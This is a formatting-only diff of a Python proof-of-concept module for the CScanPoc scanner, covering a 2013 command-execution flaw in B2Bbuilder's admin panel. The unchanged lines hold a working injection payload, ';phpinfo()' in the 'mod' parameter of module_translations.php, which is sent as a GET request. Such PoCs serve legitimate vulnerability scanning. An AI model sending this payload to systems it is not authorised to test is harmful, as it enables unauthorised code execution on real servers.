@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'B2Bbuilder_0004' # 平台漏洞编号，留空
+    vuln_id = 'B2Bbuilder_0004'  # 平台漏洞编号，留空
     name = 'B2Bbuilder 后台命令执行'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2013-10-03'  # 漏洞公布时间
     desc = '''
         B2Bbuilder后台命令执行漏洞。
@@ -32,7 +33,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/admin/module_translations.php?mod=;phpinfo()'
             url = self.target + payload
             r = requests.get(url)
@@ -46,6 +47,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
